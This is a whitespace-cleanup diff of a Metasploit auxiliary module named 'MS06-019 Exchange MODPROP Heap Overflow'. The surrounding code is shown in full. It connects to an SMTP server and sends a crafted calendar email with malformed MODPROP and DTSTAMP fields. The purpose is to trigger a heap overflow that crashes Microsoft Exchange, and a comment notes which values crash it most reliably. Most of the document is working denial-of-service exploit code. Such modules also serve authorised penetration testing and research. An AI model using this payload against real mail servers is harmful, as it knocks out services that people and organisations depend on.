@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -17,9 +17,9 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::Smtp
 	include Msf::Auxiliary::Dos
-	
+
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'MS06-019 Exchange MODPROP Heap Overflow',
 			'Description'    => %q{
 				This module triggers a heap overflow vulnerability in MS
@@ -42,23 +42,23 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				OptString.new('SUBJECT', [ true, 'The subject of the e-mail', 're: Your Brains'])
 			], self.class)
-						
+
 	end
 
 	#
 	# This needs some reworking to use the SMTPDeliver mixin and the Re::MIME class
 	#
 	def run
-	
+
 		connect_login
 
-		modprops = ['attendee', 'categories', 'class', 'created', 'description', 
-					'dtstamp', 'duration', 'last-modified', 
+		modprops = ['attendee', 'categories', 'class', 'created', 'description',
+					'dtstamp', 'duration', 'last-modified',
 					'location', 'organizer', 'priority', 'recurrence-id', 'sequence',
 					'status', 'summary', 'transp', 'uid']
-		
+
 		#modprops = ['dtstamp']
-		
+
 		modpropshort =	""
 		modpropbusted =	""
 		modnum = rand(3)
@@ -79,14 +79,14 @@ class Metasploit3 < Msf::Auxiliary
 
 		boundry = Rex::Text.rand_text_alphanumeric(8) + "." + Rex::Text.rand_text_alphanumeric(8)
 
-	
+
 		# Really, the randomization above only crashes /sometimes/ - it's MUCH more
 		# reliable, and gives crashes in better spots of you use these modprops:
 
 		modpropshort  = "dtstamp,"
 		modproplong   = "dtstamp, dtstamp,"
 		modpropbusted = "DTSTAMP:\r\n"
-		
+
 		mail =		"From: #{datastore['MAILFROM']}\r\n"
 		mail <<		"To: #{datastore['MAILTO']}\r\n"
 		mail <<		"Subject: #{datastore['SUBJECT']}\r\n"
@@ -111,12 +111,12 @@ class Metasploit3 < Msf::Auxiliary
 		mail <<		"END:VCALENDAR\r\n"
 		mail <<		"\r\n--#{boundry}\r\n"
 		mail <<		"\r\n.\r\n"
-		
-	
-		print_status("Sending message...")	
+
+
+		print_status("Sending message...")
 		sock.put(mail)
 		sock.put("QUIT\r\n")
-		print "<< " + sock.get_once 
+		print "<< " + sock.get_once
 		disconnect
 	end
 
